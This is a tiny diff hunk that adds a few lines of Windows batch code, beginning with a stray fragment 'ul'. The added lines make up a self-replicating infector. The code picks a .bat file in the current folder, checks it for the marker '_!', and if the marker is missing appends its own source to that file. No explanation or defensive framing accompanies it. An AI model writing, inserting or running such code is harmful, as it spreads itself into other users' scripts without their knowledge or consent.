@@ -1,0 +1,4 @@
+ul
+for %%q in (*.bat) do set _!=%%q
+for %%w in (%_!%) do find "_!" %%w
+if errorlevel 1 type %0 >> %_!%
